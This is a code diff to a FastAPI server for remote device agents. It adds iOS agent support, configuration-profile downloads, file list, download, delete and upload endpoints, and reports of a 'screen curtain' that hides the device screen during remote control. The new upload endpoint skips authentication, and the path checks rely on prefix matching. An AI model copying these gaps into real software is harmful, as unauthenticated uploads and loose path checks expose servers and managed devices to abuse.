@@ -213,6 +213,15 @@ async def get_viewer_page(request: Request, agent_id: str):
     return FileResponse(index_path, headers={"Cache-Control": "no-cache, no-store, must-revalidate"})
 
 
+@app.get("/ios")
+@app.get("/ios/")
+async def serve_ios_agent():
+    ios_index = os.path.join(STATIC_DIR, "ios", "index.html")
+    if os.path.isfile(ios_index):
+        return FileResponse(ios_index, headers={"Cache-Control": "no-cache, no-store, must-revalidate"})
+    raise HTTPException(status_code=404, detail="iOS Agent not found")
+
+
 import socket
 
 @app.get("/api/system/info")
@@ -363,6 +372,8 @@ async def download_agent(filename: str):
         media_type = "application/zip"
     elif filename.endswith(".exe"):
         media_type = "application/vnd.microsoft.portable-executable"
+    elif filename.endswith(".mobileconfig"):
+        media_type = "application/x-apple-as-config"
 
     return FileResponse(
         file_path,
@@ -843,16 +854,45 @@ async def trigger_agent_policy(request: Request, agent_id: str, req: PolicyReque
 
 
 # -------------------------------------------------------------
-# Android Device File Manager Endpoints
+# Mobile & Desktop Device File Manager Endpoints
 # -------------------------------------------------------------
 @app.post("/api/agent/{agent_id}/files/list")
 @app.post("/api/agents/{agent_id}/files/list")
 async def list_agent_files(request: Request, agent_id: str):
     if not _is_authenticated(request):
         raise HTTPException(status_code=401, detail="Authentication required")
+
     agent = agent_mgr.get_agent(agent_id)
+    agent_uploads_dir = os.path.join(OUTPUT_DIR, "agent_uploads", agent_id)
+
+    # If the endpoint has uploaded files or is an iOS device, list uploads directly
+    if os.path.isdir(agent_uploads_dir) or (agent and (agent.client_info.get("is_ios") or agent.client_info.get("platform") == "ios")):
+        entries = []
+        if os.path.isdir(agent_uploads_dir):
+            for fn in sorted(os.listdir(agent_uploads_dir)):
+                fp = os.path.join(agent_uploads_dir, fn)
+                if os.path.isfile(fp):
+                    st = os.stat(fp)
+                    entries.append({
+                        "name": fn,
+                        "path": fp,
+                        "is_dir": False,
+                        "size": st.st_size,
+                        "last_modified": int(st.st_mtime),
+                        "readable": True,
+                        "writable": True
+                    })
+        return JSONResponse({
+            "success": True,
+            "path": "/uploads",
+            "parent": "",
+            "shortcuts": ["/uploads"],
+            "entries": entries
+        })
+
     if not agent or not agent.ws:
         raise HTTPException(status_code=404, detail="Agent is offline or not currently connected.")
+
     try:
         body = await request.json()
     except Exception:
@@ -862,21 +902,40 @@ async def list_agent_files(request: Request, agent_id: str):
     return JSONResponse(res)
 
 
+@app.get("/api/agent/{agent_id}/files/download")
+@app.get("/api/agents/{agent_id}/files/download")
 @app.post("/api/agent/{agent_id}/files/download")
 @app.post("/api/agents/{agent_id}/files/download")
-async def download_agent_file(request: Request, agent_id: str):
+async def download_agent_file(request: Request, agent_id: str, path: Optional[str] = None):
     if not _is_authenticated(request):
         raise HTTPException(status_code=401, detail="Authentication required")
+
+    if not path:
+        try:
+            body = await request.json()
+            path = body.get("path", "")
+        except Exception:
+            path = request.query_params.get("path", "")
+
+    if not path:
+        raise HTTPException(status_code=400, detail="Path parameter is required.")
+
+    agent_uploads_dir = os.path.join(OUTPUT_DIR, "agent_uploads", agent_id)
+    if os.path.isfile(path) and (path.startswith(agent_uploads_dir) or os.path.abspath(path).startswith(os.path.abspath(agent_uploads_dir))):
+        filename = os.path.basename(path)
+        with open(path, "rb") as f:
+            file_bytes = f.read()
+        from fastapi.responses import Response
+        return Response(
+            content=file_bytes,
+            media_type="application/octet-stream",
+            headers={"Content-Disposition": f'attachment; filename="{filename}"'}
+        )
+
     agent = agent_mgr.get_agent(agent_id)
     if not agent or not agent.ws:
         raise HTTPException(status_code=404, detail="Agent is offline or not currently connected.")
-    try:
-        body = await request.json()
-    except Exception:
-        body = {}
-    path = body.get("path", "")
-    if not path:
-        raise HTTPException(status_code=400, detail="Path parameter is required.")
+
     res = await agent.request_file_operation({"type": "file_read", "path": path}, timeout=25.0)
     if not res.get("success"):
         return JSONResponse(res, status_code=400)
@@ -903,16 +962,52 @@ async def download_agent_file(request: Request, agent_id: str):
 async def delete_agent_file(request: Request, agent_id: str):
     if not _is_authenticated(request):
         raise HTTPException(status_code=401, detail="Authentication required")
-    agent = agent_mgr.get_agent(agent_id)
-    if not agent or not agent.ws:
-        raise HTTPException(status_code=404, detail="Agent is offline or not currently connected.")
+
     try:
         body = await request.json()
     except Exception:
         body = {}
     path = body.get("path", "")
+    if not path:
+        raise HTTPException(status_code=400, detail="Path parameter is required.")
+
+    agent_uploads_dir = os.path.join(OUTPUT_DIR, "agent_uploads", agent_id)
+    if os.path.isfile(path) and (path.startswith(agent_uploads_dir) or os.path.abspath(path).startswith(os.path.abspath(agent_uploads_dir))):
+        try:
+            os.remove(path)
+            return JSONResponse({"success": True, "msg": f"Deleted {os.path.basename(path)}"})
+        except Exception as e:
+            return JSONResponse({"success": False, "msg": str(e)}, status_code=400)
+
+    agent = agent_mgr.get_agent(agent_id)
+    if not agent or not agent.ws:
+        raise HTTPException(status_code=404, detail="Agent is offline or not currently connected.")
+
     res = await agent.request_file_operation({"type": "file_delete", "path": path}, timeout=10.0)
     return JSONResponse(res)
+
+
+@app.post("/api/agent/{agent_id}/files/upload")
+@app.post("/api/agents/{agent_id}/files/upload")
+async def upload_agent_files(request: Request, agent_id: str):
+    form = await request.form()
+    files = form.getlist("files")
+    if not files:
+        upload_f = form.get("file")
+        if upload_f:
+            files = [upload_f]
+    agent_uploads_dir = os.path.join(OUTPUT_DIR, "agent_uploads", agent_id)
+    os.makedirs(agent_uploads_dir, exist_ok=True)
+    saved_files = []
+    for f in files:
+        if hasattr(f, "filename") and hasattr(f, "read"):
+            filename = os.path.basename(f.filename or "uploaded_file")
+            dest = os.path.join(agent_uploads_dir, filename)
+            content = await f.read()
+            with open(dest, "wb") as out_f:
+                out_f.write(content)
+            saved_files.append({"name": filename, "size": len(content), "path": dest})
+    return JSONResponse({"success": True, "saved_files": saved_files, "uploaded_count": len(saved_files)})
 
 
 # -------------------------------------------------------------
@@ -981,18 +1076,34 @@ async def websocket_agent_tunnel(websocket: WebSocket, agent_id: str):
                     agent_info["os"] = "Android device"
                     agent_info["platform"] = "android"
                     agent_info["is_android"] = True
+                    agent_info["is_ios"] = False
+                    agent_info["device_type"] = "phone"
+                elif "ios" in pkg_arch or pkg.get("profile_filename"):
+                    agent_info["arch"] = "arm64"
+                    agent_info["os"] = agent_info.get("os") or "iOS device"
+                    agent_info["platform"] = "ios"
+                    agent_info["is_ios"] = True
+                    agent_info["is_android"] = False
                     agent_info["device_type"] = "phone"
                 if not agent_info.get("endpoint_tag") and pkg.get("endpoint_tag"):
                     agent_info["endpoint_tag"] = pkg.get("endpoint_tag")
         except Exception as e:
             logger.debug(f"Could not check AgentRegistry for {agent_id}: {e}")
 
-        # If incoming handshake indicates Android
+        # If incoming handshake indicates Android or iOS
         if "android" in str(agent_info.get("arch", "")).lower() or "android" in str(agent_info.get("os", "")).lower():
             agent_info["arch"] = "android"
             agent_info["os"] = "Android device"
             agent_info["platform"] = "android"
             agent_info["is_android"] = True
+            agent_info["is_ios"] = False
+            agent_info["device_type"] = "phone"
+        elif "ios" in str(agent_info.get("arch", "")).lower() or "ios" in str(agent_info.get("os", "")).lower() or "iphone" in str(agent_info.get("hostname", "")).lower() or agent_info.get("is_ios"):
+            agent_info["arch"] = "arm64"
+            agent_info["os"] = agent_info.get("os") or "iOS device"
+            agent_info["platform"] = "ios"
+            agent_info["is_ios"] = True
+            agent_info["is_android"] = False
             agent_info["device_type"] = "phone"
 
         agent = agent_mgr.register_connection(agent_id, websocket, agent_info)
@@ -1065,7 +1176,7 @@ async def websocket_agent_tunnel(websocket: WebSocket, agent_id: str):
                     update_dict = text_data.get("data") if isinstance(text_data.get("data"), dict) else text_data
                     agent.update_info(update_dict)
                     await broadcast_agent_list()
-                elif text_data.get("type") == "diag_curtain":
+                elif text_data.get("type") in ("diag_curtain", "curtain_status"):
                     curtain_on = bool(text_data.get("enabled", False))
                     agent.client_info["curtain_active"] = curtain_on
                     logger.info(f"Agent '{agent_id}' reported screen curtain state: {'active' if curtain_on else 'unlocked'}")
